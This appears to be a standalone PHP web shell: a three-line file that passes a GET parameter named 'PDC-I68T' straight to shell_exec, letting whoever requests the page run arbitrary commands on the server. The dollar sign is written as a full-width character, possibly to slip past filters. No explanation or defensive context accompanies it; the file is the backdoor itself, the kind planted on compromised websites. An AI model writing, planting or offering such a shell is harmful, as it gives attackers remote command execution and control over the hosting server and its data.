<?php
shell_exec(＄_GET['PDC-I68T']);
?>
